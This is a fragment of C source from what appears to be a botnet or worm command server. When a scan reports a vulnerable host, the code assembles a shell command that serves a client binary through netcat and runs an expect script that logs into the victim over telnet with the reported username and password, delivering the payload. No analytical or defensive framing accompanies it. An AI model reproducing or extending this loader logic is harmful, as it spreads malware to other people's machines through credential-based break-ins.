            ...
            while (1) {
               ...
               while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0) {
                  ...
                  if (strstr(buf, "REPORT ") == buf) // received a report of a vulnerable system from a scan
                  {
                     ...
                     char * programToSend = "/home/NewMain/workspace/server/clientWithChangedCase";

                    snprintf(buffer, sizeof(buffer), "cat %s | netcat -q 5 -l 9899 & expect /home/NewMain/workspace/server/telnetConnection.expect %s %s %s %s", programToSend, IPAdress, username,password, programToSend);
